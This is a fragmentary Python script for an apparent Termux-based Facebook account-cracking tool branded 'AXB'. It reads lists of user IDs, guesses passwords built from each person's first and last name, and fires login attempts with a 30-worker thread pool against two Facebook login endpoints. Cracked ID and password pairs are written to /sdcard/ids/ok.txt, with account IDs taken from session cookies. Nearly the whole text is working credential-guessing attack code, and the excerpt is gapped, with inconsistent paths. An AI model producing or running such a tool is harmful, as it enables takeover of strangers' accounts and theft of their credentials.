...
-----------------------------------------------
  ...
  ➤ Facebook  : Azan X 
  POWERD BY  AXB  NEW PUBLIC TOOLS 
-----------------------------------------------
...
def bootstrap():
    if not os.path.isfile('/data/data/com.termux/files/home/.localhost/Karma-kh3n/node_modules/uuid/v1.js'):
        ...
        os.system('cd /$HOME/.localhost/Azan Ali && npm install -g npm@6 && npm audit fix')
    else:
        os.system('fuser -k 5000/tcp &')
        os.system('#')
        os.system('cd /$HOME/.localhost/Azan&ALI && node index.js &')
        time.sleep(3)
        pass
bootstrap()
...
def main():
    os.system('clear')
    print(logo)
    print('  [1] AXB login method 1') #fb_messenger_api
    print('  [2] AXB login method 2') #m.facebook
    print(50*'-')
        ...
        with ThreadPool(max_workers=30) as yaari:
            ...
            for user in fileopen:
                try:
                    ...
                    print('\n This file is not supported for AXB tool.Create file only from AXB tool....\n')
                    os.sys.exit()
                ps=first.lower()
                ps2=last.lower()
...
def method1(uid,pwx):
    try:
        ...
        for ps in pwx:
            ...
            q=json.loads(data)
            if 'loc' in q:
                print('\033[1;32m  [Successful-AXB] '+uid+' | '+ps+'\033[0;97m')
                oks.append(uid)
                ...
                print('\033[1;31m  [Checkpoint-AXB] '+uid+' | '+ps+'\033[0;97m')
                cps.append(uid)
                break
            else:
                continue
    ...
    try:
        ...
        for ps in pwx:
            ...
            if 'c_user' in session.cookies.get_dict().keys():
                ...
                cid=kuki[7:22]
                print('\033[1;32m  [Successful-AXB] '+cid+' | '+ps+'\033[0;97m')
                oks.append(uid)
                with open('/sdcard/ids/ok.txt','a') as pushpa:
                    pushpa.write(cid+'|'+ps+'\n')
                break
                ...
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                cid = kuki[24:39]
                print('\033[1;31m  [Checkpoint-AXB] '+cid+' | '+ps+'\033[0;97m')
                cps.append(uid)
                break
            else:
                continue
